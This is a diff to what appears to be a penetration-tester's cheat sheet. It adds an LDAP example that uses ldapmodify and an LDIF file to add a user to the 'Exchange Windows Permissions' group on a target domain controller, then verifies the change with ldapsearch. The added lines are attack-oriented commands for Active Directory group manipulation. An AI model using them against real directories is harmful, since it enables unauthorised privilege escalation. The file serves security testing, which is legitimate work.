@@ -75,6 +75,17 @@ References:
   ```
   ldapsearch -x -H ldap://targetdc.com -b "DC=subdomain,DC=firenation,DC=com" -W -D "CN=user_to_auth_with,CN=group_usually_Users,DC=subdomain,DC=firenation,DC=com" "(&(objectClass=group)(CN=*domain admin*))"
   ```
+- Example: add a user to a group using `ldapmodify`.
+  ```
+  > cat ldap-add-user-to-group.ldif 
+  dn: CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=corp,DC=firenation,DC=com
+  changetype: modify
+  add: member
+  member: CN=Delete Head,OU=Users,OU=Blah,OU=US,DC=corp,DC=firenation,DC=com
+  > ldapmodify -x -H ldap://targetdc -W -D "CN=user_that_can_add,CN=group_usually_Users,DC=subdomain,DC=firenation,DC=com" -f ldap-add-user-to-group.ldif 
+  modifying entry "CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=corp,DC=firenation,DC=com"
+  > # check and make sure it worked!
+  > ldapsearch -x -H ldap://targetdc.com -b "DC=subdomain,DC=firenation,DC=com" -W -D "CN=user_to_auth_with,CN=group_usually_Users,DC=subdomain,DC=firenation,DC=com" "(&(objectClass=group)(CN=Exchange Windows Permissions))"
 
 ## TCP/88 Kerberos
 - KRB5 Guessing
